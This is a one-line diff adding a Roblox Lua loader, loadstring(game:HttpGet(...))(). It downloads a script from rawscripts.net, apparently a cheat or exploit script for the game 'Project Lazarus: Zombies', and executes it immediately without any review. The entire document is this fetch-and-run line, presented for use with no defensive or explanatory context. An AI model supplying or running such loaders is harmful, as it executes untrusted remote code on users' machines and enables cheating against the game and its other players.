@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Project-Lazarus:-ZOMBIES-Project-lazarus-script-77968"))()
